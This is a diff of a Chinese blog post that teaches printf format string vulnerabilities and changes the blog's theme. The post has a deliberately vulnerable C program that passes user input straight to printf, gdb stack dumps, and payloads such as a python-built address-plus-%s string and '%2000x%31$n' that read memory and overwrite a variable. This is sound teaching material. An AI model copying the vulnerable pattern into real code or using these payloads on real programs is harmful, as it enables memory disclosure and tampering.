@@ -1,366 +1,125 @@
-<!doctype html>
-
-
-
-  
-
-
-<html class="theme-next pisces use-motion" lang="zh-Hans">
+<!DOCTYPE html>
+<html>
+    
 <head>
-  <meta charset="UTF-8"/>
-<meta http-equiv="X-UA-Compatible" content="IE=edge" />
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
-
-
-
-<meta http-equiv="Cache-Control" content="no-transform" />
-<meta http-equiv="Cache-Control" content="no-siteapp" />
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-  
-  
-  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
-
-
-
-
-  
-  
-  
-  
-
-  
+    <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="generator" content="silence">
+    <title>silence - 格式化字符串漏洞（一）漏洞原理</title>
+    <meta name="author" content="mara silence">
+    <meta name="description" content="null">
+    <link rel="icon" href="/assets/images/null">
     
+    <!--STYLES-->
+    <link rel="stylesheet" href="/assets/css/font-awesome.css">
+    <link rel="stylesheet" href="/assets/css/jquery.fancybox.css">
+    <link rel="stylesheet" href="/assets/css/jquery.fancybox-thumbs.css">
+    <link rel="stylesheet" href="/assets/css/tranquilpeak.css">
+    <!--STYLES END-->
     
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-    
-    
-    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
-  
-
-
-
-
-
-
-<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
-
-<link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css" />
-
-
-  <meta name="keywords" content="漏洞,原理," />
-
-
-
-
-
-
-
-
-  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.0" />
-
-
-
-
-
-
-<meta name="description" content="Printf格式化字符串漏洞0x01 格式化字符串格式化字符串漏洞是由于printf函数的缺陷而导致的攻击者可以读或者写任意内存而产生的。将会利用该漏洞实现linux下shell的执行。首先需要了解什么是格式化字符串。格式化字符串是通过一些特定的说明符对输入的参数的格式进行说明。12@requires_authorizationprintf(&quot;你的名字:%s 你的年龄:%d\n&quot;,&quot;张三&quot;,28)">
-<meta property="og:type" content="article">
-<meta property="og:title" content="格式化字符串漏洞（一）漏洞原理">
-<meta property="og:url" content="http://blog.jacksecurity.com/2017/03/22/格式化字符串—漏洞（一）/index.html">
-<meta property="og:site_name" content="silence">
-<meta property="og:description" content="Printf格式化字符串漏洞0x01 格式化字符串格式化字符串漏洞是由于printf函数的缺陷而导致的攻击者可以读或者写任意内存而产生的。将会利用该漏洞实现linux下shell的执行。首先需要了解什么是格式化字符串。格式化字符串是通过一些特定的说明符对输入的参数的格式进行说明。12@requires_authorizationprintf(&quot;你的名字:%s 你的年龄:%d\n&quot;,&quot;张三&quot;,28)">
-<meta property="og:image" content="http://blog.jacksecurity.com/image/printf_stack.png">
-<meta property="og:updated_time" content="2017-03-23T07:46:49.805Z">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="格式化字符串漏洞（一）漏洞原理">
-<meta name="twitter:description" content="Printf格式化字符串漏洞0x01 格式化字符串格式化字符串漏洞是由于printf函数的缺陷而导致的攻击者可以读或者写任意内存而产生的。将会利用该漏洞实现linux下shell的执行。首先需要了解什么是格式化字符串。格式化字符串是通过一些特定的说明符对输入的参数的格式进行说明。12@requires_authorizationprintf(&quot;你的名字:%s 你的年龄:%d\n&quot;,&quot;张三&quot;,28)">
-<meta name="twitter:image" content="http://blog.jacksecurity.com/image/printf_stack.png">
-
-
-
-<script type="text/javascript" id="hexo.configurations">
-  var NexT = window.NexT || {};
-  var CONFIG = {
-    root: '/',
-    scheme: 'Pisces',
-    sidebar: {"position":"left","display":"post","offset":12,"offset_float":0,"b2t":false,"scrollpercent":false},
-    fancybox: true,
-    motion: true,
-    duoshuo: {
-      userId: '0',
-      author: '博主'
-    },
-    algolia: {
-      applicationID: '',
-      apiKey: '',
-      indexName: '',
-      hits: {"per_page":10},
-      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
-    }
-  };
-</script>
-
-
-
-  <link rel="canonical" href="http://blog.jacksecurity.com/2017/03/22/格式化字符串—漏洞（一）/"/>
-
-
-
-
-
-  <title> 格式化字符串漏洞（一）漏洞原理 | silence </title>
 </head>
 
-<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
-
-  
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-  
-  
+    <body>
+        <div id="blog">
+            <header id="header">
+    <i id="btn-open-sidebar" class="fa fa-lg fa-bars "></i>
+    <h1 class="header-title">
+        <a class="header-title-link" href="http://blog.jacksecurity.com">silence</a>
+    </h1>
     
-  
-
-  <div class="container sidebar-position-left page-post-detail ">
-    <div class="headband"></div>
-
-    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
-      <div class="header-inner"><div class="site-brand-wrapper">
-  <div class="site-meta ">
+</header>
+            <nav id="sidebar">
     
-
-    <div class="custom-logo-site-title">
-      <a href="/"  class="brand" rel="start">
-        <span class="logo-line-before"><i></i></span>
-        <span class="site-title">silence</span>
-        <span class="logo-line-after"><i></i></span>
-      </a>
-    </div>
-      
-        <p class="site-subtitle"></p>
-      
-  </div>
-
-  <div class="site-nav-toggle">
-    <button>
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
-    </button>
-  </div>
-</div>
-
-<nav class="site-nav">
-  
-
-  
-    <ul id="menu" class="menu">
-      
+    <ul class="sidebar-buttons">
         
-        <li class="menu-item menu-item-home">
-          <a href="/" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
-            
-            首页
-          </a>
-        </li>
-      
+            <li class="sidebar-button">
+                
+                    <a  class="sidebar-button-link" href="http://blog.jacksecurity.com/">
+                
+                    <i class="sidebar-button-icon fa fa-lg fa-home"></i>
+                    <span class="sidebar-button-desc hide-md">Home</span>
+                </a>
+            </li>
         
-        <li class="menu-item menu-item-categories">
-          <a href="/categories" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
-            
-            分类
-          </a>
-        </li>
-      
+            <li class="sidebar-button">
+                
+                    <a  class="sidebar-button-link" href="http://blog.jacksecurity.com/all-categories">
+                
+                    <i class="sidebar-button-icon fa fa-lg fa-bookmark"></i>
+                    <span class="sidebar-button-desc hide-md">Categories</span>
+                </a>
+            </li>
         
-        <li class="menu-item menu-item-archives">
-          <a href="/archives" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
-            
-            归档
-          </a>
-        </li>
-      
+            <li class="sidebar-button">
+                
+                    <a  class="sidebar-button-link" href="http://blog.jacksecurity.com/all-tags">
+                
+                    <i class="sidebar-button-icon fa fa-lg fa-tags"></i>
+                    <span class="sidebar-button-desc hide-md">Tags</span>
+                </a>
+            </li>
         
-        <li class="menu-item menu-item-tags">
-          <a href="/tags" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
-            
-            标签
-          </a>
-        </li>
-      
-
-      
+            <li class="sidebar-button">
+                
+                    <a  class="sidebar-button-link" href="http://blog.jacksecurity.com/all-archives">
+                
+                    <i class="sidebar-button-icon fa fa-lg fa-archive"></i>
+                    <span class="sidebar-button-desc hide-md">Archives</span>
+                </a>
+            </li>
+        
+            <li class="sidebar-button">
+                
+                    <a  class="sidebar-button-link" href="http://blog.jacksecurity.com/#about">
+                
+                    <i class="sidebar-button-icon fa fa-lg fa-question"></i>
+                    <span class="sidebar-button-desc hide-md">About me</span>
+                </a>
+            </li>
+        
     </ul>
-  
+    
 
-  
+    <ul class="sidebar-icons">
+        
+    </ul>
+
+    <div class="links">
+        <span>Links</span>
+        <ul class="list">
+            
+                <li>
+                    
+                        <a href="http://hexo.io" target="_blank">
+                    
+                        <span class="sidebar-button-desc hide-md">Hexo</span>
+                    </a>
+                </li>
+            
+        </ul>
+    </div>
 </nav>
-
-
-
- </div>
-    </header>
-
-    <main id="main" class="main">
-      <div class="main-inner">
-        <div class="content-wrap">
-          <div id="content" class="content">
-            
-
-  <div id="posts" class="posts-expand">
-    
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://blog.jacksecurity.com/2017/03/22/格式化字符串—漏洞（一）/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="mara silence">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="silence">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                格式化字符串漏洞（一）漏洞原理
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-03-22T15:24:30+08:00">
-                2017-03-22
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/漏洞/" itemprop="url" rel="index">
-                    <span itemprop="name">漏洞</span>
-                  </a>
-                </span>
-
+            <div id="main">
                 
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
+<article class="post" itemscope itemType="http://schema.org/BlogPosting">
     
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        <h1 id="Printf格式化字符串漏洞"><a href="#Printf格式化字符串漏洞" class="headerlink" title="Printf格式化字符串漏洞"></a>Printf格式化字符串漏洞</h1><h2 id="0x01-格式化字符串"><a href="#0x01-格式化字符串" class="headerlink" title="0x01 格式化字符串"></a>0x01 格式化字符串</h2><p><font color="green" face="黑体">格式化字符串漏洞是由于printf函数的缺陷而导致的攻击者可以读或者写任意内存而产生的。将会利用该漏洞实现linux下shell的执行。</font><br>首先需要了解什么是格式化字符串。格式化字符串是通过一些特定的说明符对输入的参数的格式进行说明。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">@<span class="function">requires_authorization</span></div><div class="line"><span class="title">printf</span><span class="params">(<span class="string">"你的名字:%s 你的年龄:%d\n"</span>,<span class="string">"张三"</span>,<span class="number">28</span>)</span>;</div></pre></td></tr></table></figure></p>
+        <div class="post-header main-content-wrap">
+    
+        <h1 class="post-title" itemprop="headline">格式化字符串漏洞（一）漏洞原理</h1>
+    
+    
+</div>
+    
+    <div class="post-content markdown main-content-wrap" itemprop="articleBody">
+        <h1 id="Printf格式化字符串漏洞"><a href="#Printf格式化字符串漏洞" class="headerlink" title="Printf格式化字符串漏洞"></a>Printf格式化字符串漏洞</h1><a id="more"></a>
+<h2 id="0x01-格式化字符串"><a href="#0x01-格式化字符串" class="headerlink" title="0x01 格式化字符串"></a>0x01 格式化字符串</h2><p><font color="green" face="黑体">格式化字符串漏洞是由于printf函数的缺陷而导致的攻击者可以读或者写任意内存而产生的。将会利用该漏洞实现linux下shell的执行。</font><br>首先需要了解什么是格式化字符串。格式化字符串是通过一些特定的说明符对输入的参数的格式进行说明。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">@<span class="function">requires_authorization</span></div><div class="line"><span class="title">printf</span><span class="params">(<span class="string">"你的名字:%s 你的年龄:%d\n"</span>,<span class="string">"张三"</span>,<span class="number">28</span>)</span>;</div></pre></td></tr></table></figure></p>
 <p>输出结果为</p>
 <blockquote>
-<p>你的名字:张三 你的年龄:28<br>printf函数的第一个参数就是格式化字符串，参数可以包括字符串文本与格式化说明符。格式化说明符告诉程序参数应该怎样输出。说明符的前缀必须是%，每当遇到一个说明符，程序<br>便回寻找一个参数，并指定其输出格式。例如%s,便是指定第二个参数”张三”输出为字符串，%d指定第三个参数输出为十进制整数。常见的说明符包括：<br>%d - 十进制 - 输出十进制整数<br>%s - 字符串 - 从内存中读取字符串<br>%x - 十六进制 - 输出十六进制数<br>%c - 字符 - 输出字符<br>%p - 指针 - 指针地址<br>%n - 将到目前为止所写的字符数写入内存</p>
+<p>你的名字:张三 你的年龄:28</p>
 </blockquote>
-<p>除了printf之外，fprintf,sprintf,snprintf等函数也可能存在格式化字符串漏洞。<br><br>printf函数还有一个特性便是参数个数不固定，最少可以只有一个参数。上面提到程序每遇到一个格式化说明符便去寻找一个参数，从堆栈的角度来看，便是依次向下读取堆栈。原理如下图<br><img src="/image/printf_stack.png" alt="ShowImage"><br>函数在调用时栈的变化顺序为：首先将函数参数入栈，然后压入函数返回地址，再压入ebp(有时不会压入ebp)，最后压入局部变量。栈帧esp上移，函数地址减小。</p>
+<p>printf函数的第一个参数就是格式化字符串，参数可以包括字符串文本与格式化说明符。格式化说明符告诉程序参数应该怎样输出。说明符的前缀必须是%，每当遇到一个说明符，程序<br>便回寻找一个参数，并指定其输出格式。例如%s,便是指定第二个参数”张三”输出为字符串，%d指定第三个参数输出为十进制整数。常见的说明符包括：<br>%d - 十进制 - 输出十进制整数<br>%s - 字符串 - 从内存中读取字符串<br>%x - 十六进制 - 输出十六进制数<br>%c - 字符 - 输出字符<br>%p - 指针 - 指针地址<br>%n - 将到目前为止所写的字符数写入内存</p>
+<p>除了printf之外，fprintf,sprintf,snprintf等函数也可能存在格式化字符串漏洞。<br><br>printf函数还有一个特性便是参数个数不固定，最少可以只有一个参数。上面提到程序每遇到一个格式化说明符便去寻找一个参数，从堆栈的角度来看，便是依次向下读取堆栈。原理如下图</p>
+<p><img src="/image/printf_stack.png" alt="ShowImage"><br>函数在调用时栈的变化顺序为：首先将函数参数入栈，然后压入函数返回地址，再压入ebp(有时不会压入ebp)，最后压入局部变量。栈帧esp上移，函数地址减小。</p>
 <h2 id="0x02-漏洞原理"><a href="#0x02-漏洞原理" class="headerlink" title="0x02 漏洞原理"></a>0x02 漏洞原理</h2><p><font color="green" face="黑体">读取内存数据</font></p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</div><div class="line">    <span class="keyword">int</span> flag=<span class="number">0</span>;</div><div class="line">    <span class="keyword">int</span> *p=&amp;flag;</div><div class="line">    <span class="keyword">char</span> a[<span class="number">100</span>];</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>,a);</div><div class="line">    <span class="built_in">printf</span>(a);</div><div class="line">    <span class="keyword">if</span>(flag == <span class="number">2000</span>)&#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"good!!\n"</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
 <p>以上述代码为例，进行内存的读取与写入操作。首先看一下，在语句”printf(a)”执行时的堆栈结构。输入a为”read:%x%x%x%x”。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">[------------------------------------stack-------------------------------------]</div><div class="line">0000| 0xffffd51c --&gt; 0x80484d6 (&lt;main+57&gt;:	mov    eax,DWORD PTR [esp+0x78])</div><div class="line">0004| 0xffffd520 --&gt; 0xffffd534 (&quot;read:%x%x%x&quot;)</div><div class="line">0008| 0xffffd524 --&gt; 0xffffd534 (&quot;read:%x%x%x&quot;)</div><div class="line">0012| 0xffffd528 --&gt; 0x3c0003f </div><div class="line">0016| 0xffffd52c --&gt; 0x0 </div><div class="line">0020| 0xffffd530 --&gt; 0xffffd5e4 --&gt; 0x6b8ff177 </div><div class="line">0024| 0xffffd534 (&quot;read:%x%x%x&quot;)</div><div class="line">0028| 0xffffd538 (&quot;:%x%x%x&quot;)</div><div class="line">[------------------------------------------------------------------------------]</div></pre></td></tr></table></figure></p>
@@ -368,7 +127,7 @@
 <p>按照十六进制读取，分别为0xffffd534,0x3c0003f,0x0，即从第三个栈开始的三个栈内存放内容的十六进制数据。<br><br>这便是prinf格式化字符串的漏洞,前面提到程序每当遇到一个格式化说明符便寻找一个参数，但由于参数是可变的，程序在执行时实际是沿着栈向下寻找，<br>即使这里prinf函数只有一个参数。通过这种方式，我们可以一直向下读取堆栈内存。当然这样仅仅是不够，这种方式只能读取堆栈内容。但通过输入”地址+%s‘<br>方式可以读取任意内存的地址。<br>在gdb中获取system函数的地址与内容。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">gdb-peda$ p system</div><div class="line">$1 = &#123;&lt;text variable, no debug info&gt;&#125; 0xf7e4ee70 &lt;system&gt;</div><div class="line">gdb-peda$ x/10wx system </div><div class="line">0xf7e4ee70 &lt;system&gt;:	0x08ec8353	0x1024448b	0x0e3c8ee8	0x83c38100</div><div class="line">0xf7e4ee80 &lt;system+16&gt;:	0x85001671	0x830974c0	0xe95b08c4	0xfffffab0</div><div class="line">0xf7e4ee90 &lt;system+32&gt;:	0x6a94838d	0xa5e8fffb</div></pre></td></tr></table></figure></p>
 <p>再尝试另外一种输入,使用python构造十六进制的字符串，并保存到文件中，在gdb中将标准输入重定向至文件。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">python -c  &apos;print &quot;read\x70\xee\xe4\xf7%x%x%x%x%x%s&quot;&apos; &gt; 111</div><div class="line">gdb-peda$ r &lt; 111</div></pre></td></tr></table></figure></p>
 <p>在printf函数入口出断点。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">[------------------------------------stack-------------------------------------]</div><div class="line">0000| 0xffffd51c --&gt; 0x80484d6 (&lt;main+57&gt;:	mov    eax,DWORD PTR [esp+0x78])</div><div class="line">0004| 0xffffd520 --&gt; 0xffffd534 (&quot;readp\356\344\367%x%x%x%x%x%s&quot;)</div><div class="line">0008| 0xffffd524 --&gt; 0xffffd534 (&quot;readp\356\344\367%x%x%x%x%x%s&quot;)</div><div class="line">0012| 0xffffd528 --&gt; 0x3c0003f </div><div class="line">0016| 0xffffd52c --&gt; 0x0 </div><div class="line">0020| 0xffffd530 --&gt; 0xffffd5e4 --&gt; 0x2696556a </div><div class="line">0024| 0xffffd534 (&quot;readp\356\344\367%x%x%x%x%x%s&quot;)</div><div class="line">0028| 0xffffd538 --&gt; 0xf7e4ee70 (&lt;system&gt;:	push   ebx)</div><div class="line">[------------------------------------------------------------------------------]</div></pre></td></tr></table></figure></p>
-<p>可以看到我们写入的地址存在最后一个栈中。与第一个参数的地址偏移是6，输入的参数的意义是第2-6个参数即第3-7个栈的内容以16进制输出。<br>而%s是将最后一个栈中的存放地址所指向的内存以字符串的方式进行输出。如果使用%x只能得到栈中的地址即0xf7e4ee70。通过%s可以得到这个<br>地址所指向的内存的数据，直到遇到0x00结束。<br>输入的参数也可以是”%6$s”,意义是将第7个参数以字符串的方式输出。可以达到与”%x%x%x%x%x%s”类似的效果。<br>查看输出的内容</p>
+<p>可以看到第一个参数在0xffffd520，我们写入的地址存在最后一个栈中，与第一个参数的栈偏移是6。”%x%x%x%x%x%s”是第2-6个参数即偏移1-5的栈的内容以16进制输出。<br>而%s是将最后一个栈中存放的地址所指向的内存以字符串的方式进行输出。如果使用%x只能得到栈中的地址即0xf7e4ee70。通过%s可以得到这个<br>地址所指向的内存的数据，直到遇到0x00结束。<br>输入的参数也可以是”%6$s”,意义是将第7个参数以字符串的方式输出。可以达到与”%x%x%x%x%x%s”类似的效果。<br>查看输出的内容</p>
 <blockquote>
 <p>readp\xee\xe4\xf7ffffd5343c0003f0ffffd5e464616572S<br>\x83\xec\x08\x8b\x44x\24\x10\xe8\x8e\x3c\x0e</p>
 </blockquote>
@@ -377,350 +136,118 @@
 <p>在函数源代码中可以看到，当flag=2000时，程序会输出”good”。通过格式化说明符”%n”，可以将任意数据写入任意内存。要注意的是，”%n”是将<br>之前打印的字节数写入栈中存放的地址所指向的内存。与”%s”有些类似，不同的是前者是写，后者是读。这里要修改flag的值需要找到存放其地址<br>的栈空间。源程序中p指向flag，所以只需要找到p所在的栈空间，并写入2000，就可以达到想要的效果。可以通过Ida或者gdb寻找p的地址。程序部分<br>反汇编代码如下：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">[----------------------------------registers-----------------------------------]</div><div class="line">EAX: 0x1 </div><div class="line">EBX: 0xf7fb6000 --&gt; 0x1a6da8 </div><div class="line">ECX: 0xe5e8d621 </div><div class="line">EDX: 0xffffd5d4 --&gt; 0xf7fb6000 --&gt; 0x1a6da8 </div><div class="line">ESI: 0x0 </div><div class="line">EDI: 0x0 </div><div class="line">EBP: 0xffffd5a8 --&gt; 0x0 </div><div class="line">ESP: 0xffffd520 --&gt; 0x3 </div><div class="line">EIP: 0x80484a6 (&lt;main+9&gt;:	mov    DWORD PTR [esp+0x78],0x0)</div><div class="line">EFLAGS: 0x283 (CARRY parity adjust zero SIGN trap INTERRUPT direction overflow)</div><div class="line">[-------------------------------------code-------------------------------------]</div><div class="line">   0x804849e &lt;main+1&gt;:	mov    ebp,esp</div><div class="line">   0x80484a0 &lt;main+3&gt;:	and    esp,0xfffffff0</div><div class="line">   0x80484a3 &lt;main+6&gt;:	add    esp,0xffffff80</div><div class="line">=&gt; 0x80484a6 &lt;main+9&gt;:	mov    DWORD PTR [esp+0x78],0x0</div><div class="line">   0x80484ae &lt;main+17&gt;:	lea    eax,[esp+0x78]</div><div class="line">   0x80484b2 &lt;main+21&gt;:	mov    DWORD PTR [esp+0x7c],eax</div><div class="line">   0x80484b6 &lt;main+25&gt;:	lea    eax,[esp+0x14]</div><div class="line">   0x80484ba &lt;main+29&gt;:	mov    DWORD PTR [esp+0x4],eax</div></pre></td></tr></table></figure>
 <p>上述代码是main函数的入口处代码，进行了栈的初始化与局部变量的初始化。flag的初始值为0,易知flag存放于esp+0x78，而p存放于esp+0x7c，<br>即0xffffd59c。下面需要构造格式化字符串覆盖flag。输入参数”%2000x%31$n”。在printf入口下断点，堆栈如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">[------------------------------------stack-------------------------------------]</div><div class="line">0000| 0xffffd51c --&gt; 0x80484d6 (&lt;main+57&gt;:	mov    eax,DWORD PTR [esp+0x78])</div><div class="line">0004| 0xffffd520 --&gt; 0xffffd534 (&quot;%2000x%31$n&quot;)</div><div class="line">0008| 0xffffd524 --&gt; 0xffffd534 (&quot;%2000x%31$n&quot;)</div><div class="line">0012| 0xffffd528 --&gt; 0x3c0003f </div><div class="line">0016| 0xffffd52c --&gt; 0x0 </div><div class="line">0020| 0xffffd530 --&gt; 0xffffd5e4 --&gt; 0xbb6d5734 </div><div class="line">0024| 0xffffd534 (&quot;%2000x%31$n&quot;)</div><div class="line">0028| 0xffffd538 (&quot;0x%31$n&quot;)</div><div class="line">[------------------------------------------------------------------------------]</div><div class="line">gdb-peda$ x/33wx $esp</div><div class="line">0xffffd51c:	0x080484d6	0xffffd534	0xffffd534	0x03c0003f</div><div class="line">0xffffd52c:	0x00000000	0xffffd5e4	0x30303225	0x33257830</div><div class="line">0xffffd53c:	0x006e2431	0xf7ffd938	0x00000000	0x000000c2</div><div class="line">0xffffd54c:	0xf7ea3716	0xffffffff	0xffffd57e	0xf7e1bc34</div><div class="line">0xffffd55c:	0xf7e41fe3	0x00000000	0x00c10000	0x00000001</div><div class="line">0xffffd56c:	0x0804831d	0xffffd7a9	0x0000002f	0x0804a000</div><div class="line">0xffffd57c:	0x08048552	0x00000001	0xffffd644	0xffffd64c</div><div class="line">0xffffd58c:	0xf7e4219d	0xf7fb63c4	0xf7ffd000	0x00000000</div><div class="line">0xffffd59c:	0xffffd598</div></pre></td></tr></table></figure></p>
-<p>可以看到printf第一个参数的地址为0xffffd520,而p的地址为0xffffd59c。两者的栈偏移为0x7c/4，即31。格式化字符串中用”%31$n”程序将寻找第32个参数<br>进行内容覆写，这里也就是偏移为31的栈空间。<br>而”%2000x”，表示将参数以宽度为2000的十六进制格式输出，长度不足2000用0补齐。不论栈内存放的内容为何，都会输出2000个字符。所以，”%2000x%31$n”<br>表示，将2000写入p中存放0xffffd598，即flag指向的内存。falg位于0xffffd598,当前内容为0。<br>printf执行后，内存空间变为:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">gdb-peda$ x/33wx $esp</div><div class="line">0xffffd520:	0xffffd534	0xffffd534	0x03c0003f	0x00000000</div><div class="line">0xffffd530:	0xffffd5e4	0x30303225	0x33257830	0x006e2431</div><div class="line">0xffffd540:	0xf7ffd938	0x00000000	0x000000c2	0xf7ea3716</div><div class="line">0xffffd550:	0xffffffff	0xffffd57e	0xf7e1bc34	0xf7e41fe3</div><div class="line">0xffffd560:	0x00000000	0x00c10000	0x00000001	0x0804831d</div><div class="line">0xffffd570:	0xffffd7a9	0x0000002f	0x0804a000	0x08048552</div><div class="line">0xffffd580:	0x00000001	0xffffd644	0xffffd64c	0xf7e4219d</div><div class="line">0xffffd590:	0xf7fb63c4	0xf7ffd000	0x000007d0	0xffffd598</div><div class="line">0xffffd5a0:	0x08048500</div></pre></td></tr></table></figure></p>
+<p>可以看到printf第一个参数的地址为0xffffd520,而p的地址为0xffffd59c。两者的栈偏移为0x7c/4，即31。格式化字符串使用”%31$n”程序将寻找第32个参数<br>进行内容覆写，这里也就是偏移为31的栈空间。<br>而”%2000x”，表示将参数以宽度为2000的十六进制格式输出，长度不足2000用0补齐。不论栈内存放的内容为何，都会输出2000个字符。所以，”%2000x%31$n”<br>表示，将2000写入p中存放0xffffd598，即flag指向的内存。falg位于0xffffd598,当前内容为0。<br>printf执行后，内存空间变为:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">gdb-peda$ x/33wx $esp</div><div class="line">0xffffd520:	0xffffd534	0xffffd534	0x03c0003f	0x00000000</div><div class="line">0xffffd530:	0xffffd5e4	0x30303225	0x33257830	0x006e2431</div><div class="line">0xffffd540:	0xf7ffd938	0x00000000	0x000000c2	0xf7ea3716</div><div class="line">0xffffd550:	0xffffffff	0xffffd57e	0xf7e1bc34	0xf7e41fe3</div><div class="line">0xffffd560:	0x00000000	0x00c10000	0x00000001	0x0804831d</div><div class="line">0xffffd570:	0xffffd7a9	0x0000002f	0x0804a000	0x08048552</div><div class="line">0xffffd580:	0x00000001	0xffffd644	0xffffd64c	0xf7e4219d</div><div class="line">0xffffd590:	0xf7fb63c4	0xf7ffd000	0x000007d0	0xffffd598</div><div class="line">0xffffd5a0:	0x08048500</div></pre></td></tr></table></figure></p>
 <p>flag中存放的内容变为了0x7d0,十进制便是2000。证明格式化参数构造正确。最后程序成功输出了good.</p>
